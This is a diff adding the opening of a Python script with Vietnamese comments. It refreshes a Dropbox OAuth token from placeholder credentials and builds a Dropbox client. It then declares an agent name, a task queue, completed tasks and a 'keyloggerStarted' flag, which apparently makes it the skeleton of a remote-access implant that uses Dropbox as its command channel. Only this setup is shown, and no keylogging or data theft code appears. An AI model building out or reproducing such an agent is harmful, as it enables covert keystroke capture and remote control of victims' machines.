@@ -1,0 +1,40 @@
+import requests
+import json
+import dropbox
+import time
+
+# === Dropbox OAuth2 Configuration ===
+APP_KEY = "YOUR_APP_KEY"
+APP_SECRET = "YOUR_APP_SECRET"
+REFRESH_TOKEN = "YOUR_REFRESH_TOKEN"
+
+def get_access_token():
+    """
+    Lấy access_token mới từ Dropbox bằng refresh_token.
+    """
+    url = "https://api.dropboxapi.com/oauth2/token"
+    data = {
+        "grant_type": "refresh_token",
+        "refresh_token": REFRESH_TOKEN,
+    }
+    auth = (APP_KEY, APP_SECRET)
+    response = requests.post(url, data=data, auth=auth)
+    
+    if response.status_code == 200:
+        token = response.json()["access_token"]
+        return token
+    else:
+        print("[!] Failed to refresh token:", response.text)
+        return None
+
+# === Khởi tạo Dropbox client ===
+access_token = get_access_token()
+if not access_token:
+    raise SystemExit("[!] Could not obtain Dropbox access token.")
+dbx = dropbox.Dropbox(access_token)
+
+# === Các biến khác giữ nguyên ===
+agentName = ""
+tasks = {}
+keyloggerStarted = False
+completedTasks = []
